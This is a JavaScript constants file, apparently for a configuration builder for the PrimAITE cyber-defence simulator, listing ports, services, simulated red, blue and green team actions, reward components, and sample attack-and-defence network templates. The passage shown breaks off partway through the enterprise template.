// PrimAITE-supported network constants
// These values are validated against the actual PrimAITE codebase
// Only options defined in PrimAITE will work - do NOT add unsupported values!

// ===== PORTS (from PrimAITE PORT_LOOKUP) =====
export const PREDEFINED_PORTS = [
  { value: 'UNUSED', label: 'UNUSED (-1)', port: -1, description: 'Unused port' },
  { value: 'NONE', label: 'NONE (0)', port: 0, description: 'No port' },
  { value: 'WOL', label: 'Wake-on-LAN (9)', port: 9, description: 'Wake on LAN' },
  { value: 'FTP_DATA', label: 'FTP Data (20)', port: 20, description: 'FTP data transfer' },
  { value: 'FTP', label: 'FTP (21)', port: 21, description: 'File Transfer Protocol' },
  { value: 'SSH', label: 'SSH (22)', port: 22, description: 'Secure Shell' },
  { value: 'SMTP', label: 'SMTP (25)', port: 25, description: 'Email (SMTP)' },
  { value: 'DNS', label: 'DNS (53)', port: 53, description: 'Domain Name System' },
  { value: 'HTTP', label: 'HTTP (80)', port: 80, description: 'Web traffic' },
  { value: 'POP3', label: 'POP3 (110)', port: 110, description: 'Email (POP3)' },
  { value: 'SFTP', label: 'SFTP (115)', port: 115, description: 'Secure FTP' },
  { value: 'NTP', label: 'NTP (123)', port: 123, description: 'Network Time Protocol' },
  { value: 'IMAP', label: 'IMAP (143)', port: 143, description: 'Email (IMAP)' },
  { value: 'SNMP', label: 'SNMP (161)', port: 161, description: 'Network management' },
  { value: 'SNMP_TRAP', label: 'SNMP Trap (162)', port: 162, description: 'SNMP traps' },
  { value: 'ARP', label: 'ARP (219)', port: 219, description: 'Address Resolution Protocol' },
  { value: 'LDAP', label: 'LDAP (389)', port: 389, description: 'Directory services' },
  { value: 'HTTPS', label: 'HTTPS (443)', port: 443, description: 'Secure web traffic' },
  { value: 'SMB', label: 'SMB (445)', port: 445, description: 'File sharing' },
  { value: 'IPP', label: 'IPP (631)', port: 631, description: 'Internet Printing' },
  { value: 'SQL_SERVER', label: 'SQL Server (1433)', port: 1433, description: 'Microsoft SQL' },
  { value: 'MYSQL', label: 'MySQL (3306)', port: 3306, description: 'MySQL database' },
  { value: 'RDP', label: 'RDP (3389)', port: 3389, description: 'Remote Desktop' },
  { value: 'RTP', label: 'RTP (5004)', port: 5004, description: 'Real-time Protocol' },
  { value: 'RTP_ALT', label: 'RTP Alt (5005)', port: 5005, description: 'RTP alternative' },
  { value: 'DNS_ALT', label: 'DNS Alt (5353)', port: 5353, description: 'Multicast DNS' },
  { value: 'POSTGRES_SERVER', label: 'PostgreSQL (5432)', port: 5432, description: 'PostgreSQL database' },
  { value: 'HTTP_ALT', label: 'HTTP Alt (8080)', port: 8080, description: 'Alternative HTTP' },
  { value: 'HTTPS_ALT', label: 'HTTPS Alt (8443)', port: 8443, description: 'Alternative HTTPS' },
]

// Compatibility alias
export const COMMON_PORTS = PREDEFINED_PORTS

// ===== PROTOCOLS (from PrimAITE PROTOCOL_LOOKUP) =====
export const PREDEFINED_PROTOCOLS = [
  { value: 'tcp', label: 'TCP', description: 'Transmission Control Protocol - reliable, ordered delivery' },
  { value: 'udp', label: 'UDP', description: 'User Datagram Protocol - fast, connectionless' },
  { value: 'icmp', label: 'ICMP', description: 'Internet Control Message Protocol - ping, traceroute' },
  { value: 'none', label: 'None', description: 'No specific protocol' },
]

// Compatibility alias
export const PROTOCOLS = PREDEFINED_PROTOCOLS

// ===== NODE TYPES (from PrimAITE nodes) =====
export const NODE_TYPES = [
  { value: 'computer', label: 'Computer', icon: '💻', description: 'End-user workstation' },
  { value: 'server', label: 'Server', icon: '🖥️', description: 'Server hosting services' },
  { value: 'router', label: 'Router', icon: '📡', description: 'Routes traffic between networks' },
  { value: 'switch', label: 'Switch', icon: '🔀', description: 'Connects devices in a network' },
]

// ===== SERVICES (from PrimAITE services) =====
export const AVAILABLE_SERVICES = [
  { value: 'dns-server', label: 'DNS Server', description: 'Domain name resolution server', requiresOptions: true },
  { value: 'dns-client', label: 'DNS Client', description: 'DNS client service' },
  { value: 'web-server', label: 'Web Server', description: 'HTTP web server' },
  { value: 'database-service', label: 'Database Service', description: 'Database server', requiresOptions: true },
  { value: 'ftp-server', label: 'FTP Server', description: 'File transfer server' },
  { value: 'ftp-client', label: 'FTP Client', description: 'File transfer client' },
  { value: 'ntp-server', label: 'NTP Server', description: 'Network Time Protocol server' },
  { value: 'ntp-client', label: 'NTP Client', description: 'Network Time Protocol client' },
]

// ===== APPLICATIONS (from PrimAITE applications) =====
export const AVAILABLE_APPLICATIONS = [
  // Normal applications
  { value: 'web-browser', label: 'Web Browser', description: 'Browse websites', team: 'neutral', requiresOptions: true },
  { value: 'database-client', label: 'Database Client', description: 'Database client', team: 'neutral', requiresOptions: true },
  { value: 'nmap', label: 'Nmap', description: 'Network scanning tool', team: 'neutral' },

  // Red team (attack) applications
  { value: 'data-manipulation-bot', label: 'Data Manipulation Bot', description: 'Attack: Manipulate/delete data', team: 'red', requiresOptions: true },
  { value: 'dos-bot', label: 'DoS Bot', description: 'Attack: Denial of Service', team: 'red', requiresOptions: true },
  { value: 'ransomware-script', label: 'Ransomware Script', description: 'Attack: Encrypt files', team: 'red', requiresOptions: true },
  { value: 'c2-beacon', label: 'C2 Beacon', description: 'Attack: Command & Control beacon', team: 'red', requiresOptions: true },
  { value: 'c2-server', label: 'C2 Server', description: 'Attack: Command & Control server', team: 'red' },
]

// ===== AGENT ACTIONS (from PrimAITE actions) =====
// Complete list of all 59 actions from PrimAITE
export const RED_TEAM_ACTIONS = [
  // Basic
  { value: 'do-nothing', label: 'Do Nothing', description: 'No action' },

  // Application Actions
  { value: 'node-application-execute', label: 'Execute Application', description: 'Run an application on a node' },
  { value: 'node-application-scan', label: 'Scan Application', description: 'Scan application status' },
  { value: 'node-application-close', label: 'Close Application', description: 'Close a running application' },
  { value: 'node-application-fix', label: 'Fix Application', description: 'Repair application' },
  { value: 'node-application-install', label: 'Install Application', description: 'Install new application' },
  { value: 'node-application-remove', label: 'Remove Application', description: 'Uninstall application' },

  // File Actions
  { value: 'node-file-create', label: 'Create File', description: 'Create a new file' },
  { value: 'node-file-scan', label: 'Scan File', description: 'Scan file integrity' },
  { value: 'node-file-delete', label: 'Delete File', description: 'Remove a file' },
  { value: 'node-file-restore', label: 'Restore File', description: 'Restore deleted file' },
  { value: 'node-file-corrupt', label: 'Corrupt File', description: 'Damage file integrity' },
  { value: 'node-file-access', label: 'Access File', description: 'Access file contents' },
  { value: 'node-file-checkhash', label: 'Check File Hash', description: 'Verify file hash' },
  { value: 'node-file-repair', label: 'Repair File', description: 'Fix corrupted file' },

  // Folder Actions
  { value: 'node-folder-scan', label: 'Scan Folder', description: 'Scan folder status' },
  { value: 'node-folder-checkhash', label: 'Check Folder Hash', description: 'Verify folder integrity' },
  { value: 'node-folder-repair', label: 'Repair Folder', description: 'Fix folder issues' },
  { value: 'node-folder-restore', label: 'Restore Folder', description: 'Restore folder from backup' },
  { value: 'node-folder-create', label: 'Create Folder', description: 'Create new folder' },

  // Network Scanning
  { value: 'node-nmap-port-scan', label: 'NMAP Port Scan', description: 'Scan for open ports' },
  { value: 'node-nmap-ping-scan', label: 'NMAP Ping Scan', description: 'Ping scan hosts' },
  { value: 'node-network-service-recon', label: 'Network Service Recon', description: 'Reconnaissance of network services' },

  // Node/OS Actions
  { value: 'node-os-scan', label: 'OS Scan', description: 'Scan operating system' },
  { value: 'node-shutdown', label: 'Shutdown Node', description: 'Power off node' },
  { value: 'node-startup', label: 'Startup Node', description: 'Power on node' },
  { value: 'node-reset', label: 'Reset Node', description: 'Restart node' },
  { value: 'node-send-local-command', label: 'Local Command', description: 'Execute local command' },
  { value: 'node-send-remote-command', label: 'Remote Command', description: 'Execute remote command' },

  // Account Management
  { value: 'node-accounts-add-user', label: 'Add User', description: 'Create new user account' },
  { value: 'node-accounts-disable-user', label: 'Disable User', description: 'Disable user account' },
  { value: 'node-account-change-password', label: 'Change Password', description: 'Modify user password' },

  // Session Management
  { value: 'node-sessions-remote-login', label: 'Remote Login', description: 'Login to remote system' },
  { value: 'node-sessions-remote-logout', label: 'Remote Logout', description: 'Logout from remote system' },

  // Malware Configuration
  { value: 'configure-ransomware-script', label: 'Configure Ransomware', description: 'Setup ransomware' },
  { value: 'configure-c2-beacon', label: 'Configure C2 Beacon', description: 'Setup C2 beacon' },
  { value: 'configure-database-client', label: 'Configure DB Client', description: 'Setup database client' },
  { value: 'configure-dos-bot', label: 'Configure DoS Bot', description: 'Setup DoS attack' },

  // C2 Server Actions
  { value: 'c2-server-ransomware-launch', label: 'C2 Launch Ransomware', description: 'Trigger ransomware attack' },
  { value: 'c2-server-terminal-command', label: 'C2 Terminal Command', description: 'Execute command via C2' },
  { value: 'c2-server-data-exfiltrate', label: 'C2 Exfiltrate Data', description: 'Steal data via C2' },
  { value: 'c2-server-ransomware-configure', label: 'C2 Configure Ransomware', description: 'Setup ransomware on C2 server' },
]

export const BLUE_TEAM_ACTIONS = [
  // Basic
  { value: 'do-nothing', label: 'Do Nothing', description: 'No action' },

  // Service Management
  { value: 'node-service-scan', label: 'Scan Service', description: 'Check service status' },
  { value: 'node-service-stop', label: 'Stop Service', description: 'Stop a service' },
  { value: 'node-service-start', label: 'Start Service', description: 'Start a service' },
  { value: 'node-service-pause', label: 'Pause Service', description: 'Pause a service' },
  { value: 'node-service-resume', label: 'Resume Service', description: 'Resume paused service' },
  { value: 'node-service-restart', label: 'Restart Service', description: 'Restart a service' },
  { value: 'node-service-disable', label: 'Disable Service', description: 'Disable a service' },
  { value: 'node-service-enable', label: 'Enable Service', description: 'Enable a service' },
  { value: 'node-service-fix', label: 'Fix Service', description: 'Repair a service' },

  // Application Management
  { value: 'node-application-scan', label: 'Scan Application', description: 'Check application status' },
  { value: 'node-application-close', label: 'Close Application', description: 'Close an application' },
  { value: 'node-application-fix', label: 'Fix Application', description: 'Repair application' },
  { value: 'node-application-install', label: 'Install Application', description: 'Install new application' },
  { value: 'node-application-remove', label: 'Remove Application', description: 'Uninstall application' },

  // File Management
  { value: 'node-file-scan', label: 'Scan File', description: 'Check file integrity' },
  { value: 'node-file-delete', label: 'Delete File', description: 'Remove a file' },
  { value: 'node-file-repair', label: 'Repair File', description: 'Fix corrupted file' },
  { value: 'node-file-restore', label: 'Restore File', description: 'Restore deleted file' },
  { value: 'node-file-create', label: 'Create File', description: 'Create a new file' },
  { value: 'node-file-checkhash', label: 'Check File Hash', description: 'Verify file hash' },

  // Folder Management
  { value: 'node-folder-scan', label: 'Scan Folder', description: 'Check folder status' },
  { value: 'node-folder-repair', label: 'Repair Folder', description: 'Fix folder issues' },
  { value: 'node-folder-restore', label: 'Restore Folder', description: 'Restore folder from backup' },
  { value: 'node-folder-create', label: 'Create Folder', description: 'Create new folder' },
  { value: 'node-folder-checkhash', label: 'Check Folder Hash', description: 'Verify folder integrity' },

  // Node/OS Management
  { value: 'node-os-scan', label: 'Scan OS', description: 'Check system health' },
  { value: 'node-shutdown', label: 'Shutdown Node', description: 'Power off a node' },
  { value: 'node-startup', label: 'Startup Node', description: 'Power on a node' },
  { value: 'node-reset', label: 'Reset Node', description: 'Restart a node' },

  // Network Security (ACL/Firewall)
  { value: 'router-acl-add-rule', label: 'Add Router ACL Rule', description: 'Add router firewall rule' },
  { value: 'router-acl-remove-rule', label: 'Remove Router ACL Rule', description: 'Remove router firewall rule' },
  { value: 'firewall-acl-add-rule', label: 'Add Firewall ACL Rule', description: 'Add firewall rule' },
  { value: 'firewall-acl-remove-rule', label: 'Remove Firewall ACL Rule', description: 'Remove firewall rule' },

  // Network Interface Control
  { value: 'host-nic-disable', label: 'Disable NIC', description: 'Disable network interface' },
  { value: 'host-nic-enable', label: 'Enable NIC', description: 'Enable network interface' },
  { value: 'network-port-enable', label: 'Enable Network Port', description: 'Enable switch/router port' },
  { value: 'network-port-disable', label: 'Disable Network Port', description: 'Disable switch/router port' },

  // Account Security
  { value: 'node-accounts-add-user', label: 'Add User', description: 'Create new user account' },
  { value: 'node-accounts-disable-user', label: 'Disable User', description: 'Disable user account' },
  { value: 'node-account-change-password', label: 'Change Password', description: 'Modify user password' },

  // Session Management
  { value: 'node-sessions-remote-login', label: 'Remote Login', description: 'Login to remote system' },
  { value: 'node-sessions-remote-logout', label: 'Remote Logout', description: 'Logout from remote system' },
]

export const GREEN_TEAM_ACTIONS = [
  { value: 'do-nothing', label: 'Do Nothing', description: 'No action' },
  { value: 'node-application-execute', label: 'Execute Application', description: 'Run an application (normal use)' },
]

// ===== AGENT TYPES =====
export const AGENT_TYPES = [
  { value: 'proxy-agent', label: 'Proxy Agent (ML)', description: 'Machine learning controlled agent' },
  { value: 'probabilistic-agent', label: 'Probabilistic Agent', description: 'Random action selection', requiresProbs: true },
  { value: 'random-agent', label: 'Random Agent', description: 'Completely random actions' },
]

// ===== TEAMS =====
export const AGENT_TEAMS = [
  { value: 'RED', label: 'Red Team (Attacker)', color: '#ef4444', description: 'Offensive security team' },
  { value: 'BLUE', label: 'Blue Team (Defender)', color: '#3b82f6', description: 'Defensive security team' },
  { value: 'GREEN', label: 'Green Team (User)', color: '#10b981', description: 'Normal users' },
]

// ===== REWARD COMPONENTS (from v3.yaml) =====
export const REWARD_COMPONENTS = [
  {
    value: 'database-file-integrity',
    label: 'Database File Integrity',
    description: 'Reward/penalty based on database file status',
    requiredOptions: ['node_hostname', 'folder_name', 'file_name'],
    optionalOptions: ['intact_reward', 'deleted_penalty']
  },
  {
    value: 'webpage-unavailable-penalty',
    label: 'Webpage Unavailable Penalty',
    description: 'Penalty when webpage is unavailable',
    requiredOptions: ['node_hostname'],
    optionalOptions: ['penalty']
  },
  {
    value: 'green-admin-database-unreachable-penalty',
    label: 'Database Unreachable Penalty',
    description: 'Penalty when database cannot be reached',
    requiredOptions: ['node_hostname'],
    optionalOptions: ['penalty']
  },
  {
    value: 'action-penalty',
    label: 'Action Penalty',
    description: 'Penalties for specific actions',
    requiredOptions: ['per_action_penalty'],
    optionalOptions: []
  },
  {
    value: 'shared-reward',
    label: 'Shared Reward',
    description: 'Share reward with another agent',
    requiredOptions: ['agent_name'],
    optionalOptions: []
  },
]

// ===== ACTION OPTIONS MAPPING =====
// Defines what options each action type requires
export const ACTION_OPTIONS_MAP = {
  'do-nothing': {
    requiredOptions: [],
    optionalOptions: []
  },
  'node-application-execute': {
    requiredOptions: ['node_name', 'application_name'],
    optionalOptions: [],
    description: 'Execute an application that is already configured on the node'
  },
  'node-application-scan': {
    requiredOptions: ['node_name', 'application_name'],
    optionalOptions: []
  },
  'node-application-close': {
    requiredOptions: ['node_name', 'application_name'],
    optionalOptions: []
  },
  'configure-dos-bot': {
    requiredOptions: ['node_name'],
    optionalOptions: ['target_ip_address', 'target_port', 'payload', 'repeat', 'port_scan_p_of_success', 'dos_intensity', 'max_sessions'],
    description: 'Configure DoS bot settings (bot must exist on node)'
  },
  'configure-c2-beacon': {
    requiredOptions: ['node_name', 'c2_server_ip_address'],
    optionalOptions: ['keep_alive_frequency', 'masquerade_protocol', 'masquerade_port'],
    description: 'Configure C2 beacon settings'
  },
  'configure-ransomware-script': {
    requiredOptions: ['node_name'],
    optionalOptions: ['server_ip_address', 'server_password', 'payload'],
    description: 'Configure ransomware script'
  },
  'configure-database-client': {
    requiredOptions: ['node_name'],
    optionalOptions: ['server_ip_address', 'server_password'],
    description: 'Configure database client connection'
  },
  'node-send-remote-command': {
    requiredOptions: ['node_name', 'remote_ip', 'command'],
    optionalOptions: [],
    description: 'Send SSH command to remote node'
  },
  'c2-server-ransomware-launch': {
    requiredOptions: ['node_name'],
    optionalOptions: [],
    description: 'Launch ransomware via C2 server'
  },
  'c2-server-terminal-command': {
    requiredOptions: ['node_name', 'commands'],
    optionalOptions: ['ip_address', 'username', 'password'],
    description: 'Execute terminal commands via C2'
  },
  'c2-server-data-exfiltrate': {
    requiredOptions: ['node_name', 'target_ip_address', 'target_file_name', 'target_folder_name'],
    optionalOptions: ['exfiltration_folder_name', 'username', 'password'],
    description: 'Exfiltrate data via C2'
  },
  'node-file-corrupt': {
    requiredOptions: ['node_name', 'folder_name', 'file_name'],
    optionalOptions: []
  },
  'node-file-scan': {
    requiredOptions: ['node_name', 'folder_name', 'file_name'],
    optionalOptions: []
  },
  'node-file-delete': {
    requiredOptions: ['node_name', 'folder_name', 'file_name'],
    optionalOptions: []
  },
  'node-file-repair': {
    requiredOptions: ['node_name', 'folder_name', 'file_name'],
    optionalOptions: [],
    description: 'Repair a corrupted file'
  },
  'node-folder-scan': {
    requiredOptions: ['node_name', 'folder_name'],
    optionalOptions: []
  },
  'node-folder-repair': {
    requiredOptions: ['node_name', 'folder_name'],
    optionalOptions: []
  },
  'node-folder-restore': {
    requiredOptions: ['node_name', 'folder_name'],
    optionalOptions: []
  },
  'node-service-scan': {
    requiredOptions: ['node_name', 'service_name'],
    optionalOptions: [],
    description: 'Scan a service configured on the node'
  },
  'node-service-stop': {
    requiredOptions: ['node_name', 'service_name'],
    optionalOptions: []
  },
  'node-service-start': {
    requiredOptions: ['node_name', 'service_name'],
    optionalOptions: []
  },
  'node-service-pause': {
    requiredOptions: ['node_name', 'service_name'],
    optionalOptions: []
  },
  'node-service-resume': {
    requiredOptions: ['node_name', 'service_name'],
    optionalOptions: []
  },
  'node-service-restart': {
    requiredOptions: ['node_name', 'service_name'],
    optionalOptions: []
  },
  'node-service-disable': {
    requiredOptions: ['node_name', 'service_name'],
    optionalOptions: []
  },
  'node-service-enable': {
    requiredOptions: ['node_name', 'service_name'],
    optionalOptions: []
  },
  'node-service-fix': {
    requiredOptions: ['node_name', 'service_name'],
    optionalOptions: []
  },
  'node-os-scan': {
    requiredOptions: ['node_name'],
    optionalOptions: []
  },
  'node-shutdown': {
    requiredOptions: ['node_name'],
    optionalOptions: []
  },
  'node-startup': {
    requiredOptions: ['node_name'],
    optionalOptions: []
  },
  'node-reset': {
    requiredOptions: ['node_name'],
    optionalOptions: []
  },
  'node-nmap-port-scan': {
    requiredOptions: ['source_node', 'target_ip_address'],
    optionalOptions: ['show'],
    description: 'Scan ports on target IP using nmap'
  },
  'router-acl-add-rule': {
    requiredOptions: ['target_router', 'position', 'permission', 'src_ip', 'dst_ip', 'src_port', 'dst_port', 'protocol_name'],
    optionalOptions: ['src_wildcard', 'dst_wildcard'],
    description: 'Add firewall rule to router ACL'
  },
  'router-acl-remove-rule': {
    requiredOptions: ['target_router', 'position'],
    optionalOptions: []
  },
  'host-nic-disable': {
    requiredOptions: ['node_name', 'nic_num'],
    optionalOptions: []
  },
  'host-nic-enable': {
    requiredOptions: ['node_name', 'nic_num'],
    optionalOptions: []
  },
}

// ===== BANDWIDTH OPTIONS =====
export const BANDWIDTH_OPTIONS = [
  { value: 10, label: '10 Mbps (Ethernet)' },
  { value: 100, label: '100 Mbps (Fast Ethernet)' },
  { value: 1000, label: '1 Gbps (Gigabit Ethernet)' },
  { value: 10000, label: '10 Gbps (10-Gigabit Ethernet)' },
]

// ===== SUBNET MASKS =====
export const COMMON_SUBNETS = [
  { value: '255.255.255.0', label: '255.255.255.0 (/24 - 254 hosts)' },
  { value: '255.255.0.0', label: '255.255.0.0 (/16 - 65,534 hosts)' },
  { value: '255.0.0.0', label: '255.0.0.0 (/8 - 16,777,214 hosts)' },
  { value: '255.255.255.128', label: '255.255.255.128 (/25 - 126 hosts)' },
  { value: '255.255.255.192', label: '255.255.255.192 (/26 - 62 hosts)' },
  { value: '255.255.255.240', label: '255.255.255.240 (/28 - 14 hosts)' },
]

// ===== NETWORK TEMPLATES =====
export const NETWORK_TEMPLATES = {
  basic: {
    name: 'Basic Network',
    description: 'Simple network with router, switch, and computers - Ready for training with GREEN and BLUE agents',
    config: {
      nodes: [
        {
          hostname: 'router_1',
          type: 'router',
          numPorts: 5,
          ports: {
            1: { ip_address: '192.168.1.1', subnet_mask: '255.255.255.0' }
          },
        },
        {
          hostname: 'switch_1',
          type: 'switch',
          numPorts: 8,
        },
        {
          hostname: 'server_1',
          type: 'server',
          ipAddress: '192.168.1.12',
          subnetMask: '255.255.255.0',
          defaultGateway: '192.168.1.1',
          services: [{ type: 'web-server' }],
          applications: [],
        },
        {
          hostname: 'client_1',
          type: 'computer',
          ipAddress: '192.168.1.10',
          subnetMask: '255.255.255.0',
          defaultGateway: '192.168.1.1',
          services: [],
          applications: [
            {
              type: 'web-browser',
              options: { target_url: 'http://192.168.1.12' }
            }
          ],
        },
        {
          hostname: 'client_2',
          type: 'computer',
          ipAddress: '192.168.1.11',
          subnetMask: '255.255.255.0',
          defaultGateway: '192.168.1.1',
          services: [],
          applications: [
            {
              type: 'web-browser',
              options: { target_url: 'http://192.168.1.12' }
            }
          ],
        },
      ],
      links: [
        { endpointAHostname: 'router_1', endpointAPort: 1, endpointBHostname: 'switch_1', endpointBPort: 8, bandwidth: 100 },
        { endpointAHostname: 'switch_1', endpointAPort: 1, endpointBHostname: 'server_1', endpointBPort: 1, bandwidth: 100 },
        { endpointAHostname: 'switch_1', endpointAPort: 2, endpointBHostname: 'client_1', endpointBPort: 1, bandwidth: 100 },
        { endpointAHostname: 'switch_1', endpointAPort: 3, endpointBHostname: 'client_2', endpointBPort: 1, bandwidth: 100 },
      ],
      game: {
        maxEpisodeLength: 128,
        ports: ['HTTP', 'DNS'],
        protocols: ['tcp', 'udp', 'icmp'],
        thresholds: {
          nmne: {
            high: 10,
            medium: 5,
            low: 0
          }
        }
      },
      simulation: {
        network: {
          nmne_config: {
            capture_nmne: true,
            nmne_capture_keywords: ['DELETE']
          }
        }
      },
      agents: [
        {
          ref: 'green_user',
          team: 'GREEN',
          type: 'probabilistic-agent',
          agent_settings: {
            action_probabilities: {
              0: 0.7,
              1: 0.3
            }
          },
          action_space: {
            action_map: {
              0: {
                action: 'do-nothing',
                options: {}
              },
              1: {
                action: 'node-application-execute',
                options: {
                  node_name: 'client_1',
                  application_name: 'web-browser'
                }
              }
            }
          },
          reward_function: {
            reward_components: [
              {
                type: 'webpage-unavailable-penalty',
                weight: 1.0,
                options: {
                  node_hostname: 'client_1'
                }
              }
            ]
          }
        },
        {
          ref: 'defender',
          team: 'BLUE',
          type: 'proxy-agent',
          agent_settings: {
            flatten_obs: true,
            action_masking: true
          },
          action_space: {
            action_map: {
              0: {
                action: 'do-nothing',
                options: {}
              },
              1: {
                action: 'node-service-restart',
                options: {
                  node_name: 'server_1',
                  service_name: 'web-server'
                }
              },
              2: {
                action: 'node-shutdown',
                options: {
                  node_name: 'server_1'
                }
              },
              3: {
                action: 'node-startup',
                options: {
                  node_name: 'server_1'
                }
              }
            }
          },
          reward_function: {
            reward_components: [
              {
                type: 'shared-reward',
                weight: 1.0,
                options: {
                  agent_name: 'green_user'
                }
              }
            ]
          }
        }
      ]
    },
  },
  dmz: {
    name: 'DMZ Network - Attack & Defense',
    description: 'RED vs BLUE scenario: Attacker with DoS bot vs Defender protecting web server and database',
    config: {
      nodes: [
        {
          hostname: 'router_1',
          type: 'router',
          numPorts: 5,
          ports: {
            1: { ip_address: '192.168.1.1', subnet_mask: '255.255.255.0' },
            2: { ip_address: '192.168.10.1', subnet_mask: '255.255.255.0' },
          },
        },
        {
          hostname: 'switch_1',
          type: 'switch',
          numPorts: 8,
        },
        {
          hostname: 'switch_2',
          type: 'switch',
          numPorts: 8,
        },
        {
          hostname: 'web_server',
          type: 'server',
          ipAddress: '192.168.1.12',
          subnetMask: '255.255.255.0',
          defaultGateway: '192.168.1.1',
          services: [{ type: 'web-server' }],
          applications: [],
        },
        {
          hostname: 'database_server',
          type: 'server',
          ipAddress: '192.168.1.14',
          subnetMask: '255.255.255.0',
          defaultGateway: '192.168.1.1',
          services: [{ type: 'database-service', options: { backup_server_ip: '192.168.1.16' } }],
          applications: [],
        },
        {
          hostname: 'client_1',
          type: 'computer',
          ipAddress: '192.168.10.21',
          subnetMask: '255.255.255.0',
          defaultGateway: '192.168.10.1',
          services: [],
          applications: [
            {
              type: 'dos-bot',
              options: {
                target_ip_address: '192.168.1.12',
                target_port: 'HTTP',
                payload: 'ATTACK',
                dos_intensity: 1.0,
                max_sessions: 500
              }
            },
            {
              type: 'web-browser',
              options: {
                target_url: 'http://192.168.1.12'
              }
            }
          ],
        },
        {
          hostname: 'client_2',
          type: 'computer',
          ipAddress: '192.168.10.22',
          subnetMask: '255.255.255.0',
          defaultGateway: '192.168.10.1',
          services: [],
          applications: [
            {
              type: 'web-browser',
              options: {
                target_url: 'http://192.168.1.12'
              }
            }
          ],
        },
      ],
      links: [
        { endpointAHostname: 'router_1', endpointAPort: 1, endpointBHostname: 'switch_1', endpointBPort: 8, bandwidth: 1000 },
        { endpointAHostname: 'router_1', endpointAPort: 2, endpointBHostname: 'switch_2', endpointBPort: 8, bandwidth: 1000 },
        { endpointAHostname: 'switch_1', endpointAPort: 1, endpointBHostname: 'web_server', endpointBPort: 1, bandwidth: 1000 },
        { endpointAHostname: 'switch_1', endpointAPort: 2, endpointBHostname: 'database_server', endpointBPort: 1, bandwidth: 1000 },
        { endpointAHostname: 'switch_2', endpointAPort: 1, endpointBHostname: 'client_1', endpointBPort: 1, bandwidth: 100 },
        { endpointAHostname: 'switch_2', endpointAPort: 2, endpointBHostname: 'client_2', endpointBPort: 1, bandwidth: 100 },
      ],
      game: {
        maxEpisodeLength: 128,
        ports: ['HTTP', 'HTTPS', 'POSTGRES_SERVER'],
        protocols: ['tcp', 'udp', 'icmp'],
      },
      agents: [
        {
          ref: 'green_user_1',
          team: 'GREEN',
          type: 'probabilistic-agent',
          agent_settings: {
            action_probabilities: {
              0: 0.6,
              1: 0.4
            }
          },
          action_space: {
            action_map: {
              0: {
                action: 'do-nothing',
                options: {}
              },
              1: {
                action: 'node-application-execute',
                options: {
                  node_name: 'client_2',
                  application_name: 'web-browser'
                }
              }
            }
          },
          reward_function: {
            reward_components: [
              {
                type: 'webpage-unavailable-penalty',
                weight: 1.0,
                options: {
                  node_hostname: 'client_2'
                }
              }
            ]
          }
        },
        {
          ref: 'attacker',
          team: 'RED',
          type: 'proxy-agent',
          agent_settings: {
            flatten_obs: true,
            action_masking: true
          },
          action_space: {
            action_map: {
              0: {
                action: 'do-nothing',
                options: {}
              },
              1: {
                action: 'configure-dos-bot',
                options: {
                  node_name: 'client_1',
                  target_ip_address: '192.168.1.12',
                  target_port: 'HTTP',
                  dos_intensity: 1.0,
                  max_sessions: 500
                }
              },
              2: {
                action: 'node-application-execute',
                options: {
                  node_name: 'client_1',
                  application_name: 'dos-bot'
                }
              },
              3: {
                action: 'configure-dos-bot',
                options: {
                  node_name: 'client_1',
                  target_ip_address: '192.168.1.14',
                  target_port: 'POSTGRES_SERVER',
                  dos_intensity: 0.8
                }
              }
            }
          },
          reward_function: {
            reward_components: [
              {
                type: 'webpage-unavailable-penalty',
                weight: -1.0,
                options: {
                  node_hostname: 'client_2'
                }
              }
            ]
          }
        },
        {
          ref: 'defender',
          team: 'BLUE',
          type: 'proxy-agent',
          agent_settings: {
            flatten_obs: true,
            action_masking: true
          },
          action_space: {
            action_map: {
              0: {
                action: 'do-nothing',
                options: {}
              },
              1: {
                action: 'node-service-restart',
                options: {
                  node_name: 'web_server',
                  service_name: 'web-server'
                }
              },
              2: {
                action: 'node-service-restart',
                options: {
                  node_name: 'database_server',
                  service_name: 'database-service'
                }
              },
              3: {
                action: 'host-nic-disable',
                options: {
                  node_name: 'client_1',
                  nic_num: 1
                }
              },
              4: {
                action: 'host-nic-enable',
                options: {
                  node_name: 'client_1',
                  nic_num: 1
                }
              },
              5: {
                action: 'router-acl-add-rule',
                options: {
                  target_router: 'router_1',
                  position: 0,
                  permission: 'DENY',
                  src_ip: '192.168.10.21',
                  dst_ip: '192.168.1.12',
                  src_port: 'ALL',
                  dst_port: 'HTTP',
                  protocol_name: 'tcp'
                }
              }
            }
          },
          reward_function: {
            reward_components: [
              {
                type: 'shared-reward',
                weight: 1.0,
                options: {
                  agent_name: 'green_user_1'
                }
              }
            ]
          }
        }
      ]
    },
  },
  v3: {
    name: 'V3 Enterprise Network - Full RED vs BLUE Training',
    description: 'Complete enterprise network from v3.yaml with RED (attacker), BLUE (defender), and GREEN (users) teams. Includes C2 server, multiple attack vectors, and comprehensive defense actions.',
    config: {
      nodes: [
        {
          hostname: 'router_1',
          type: 'router',
          numPorts: 5,
          ports: {
            1: { ip_address: '192.168.1.1', subnet_mask: '255.255.255.0' },
            2: { ip_address: '192.168.10.1', subnet_mask: '255.255.255.0' },
          },
          acl: {
            18: { action: 'PERMIT', src_port: 'POSTGRES_SERVER', dst_port: 'POSTGRES_SERVER' },
            19: { action: 'PERMIT', src_port: 'DNS', dst_port: 'DNS' },
            20: { action: 'PERMIT', src_port: 'FTP', dst_port: 'FTP' },
            21: { action: 'PERMIT', src_port: 'HTTP', dst_port: 'HTTP' },
            22: { action: 'PERMIT', src_port: 'ARP', dst_port: 'ARP' },
            23: { action: 'PERMIT', protocol: 'ICMP' },
          }
        },
        {
          hostname: 'switch_1',
          type: 'switch',
          numPorts: 8,
        },
        {
          hostname: 'switch_2',
          type: 'switch',
          numPorts: 8,
        },
        {
          hostname: 'domain_controller',
          type: 'server',
          ipAddress: '192.168.1.10',
          subnetMask: '255.255.255.0',
          defaultGateway: '192.168.1.1',
          services: [
            {
              type: 'dns-server',
              options: {
                domain_mapping: {
                  'arcd.com': '192.168.1.12'
                }
              }
            }
          ],
        },
        {
          hostname: 'web_server',
          type: 'server',
          ipAddress: '192.168.1.12',
          subnetMask: '255.255.255.0',
          defaultGateway: '192.168.1.1',
          services: [{ type: 'web-server' }],
          applications: [
            {
              type: 'database-client',
              options: {
                db_server_ip: '192.168.1.14'
              }
            }
          ],
        },
        {
          hostname: 'database_server',
          type: 'server',
          ipAddress: '192.168.1.14',
          subnetMask: '255.255.255.0',
          defaultGateway: '192.168.1.1',
          services: [
            {
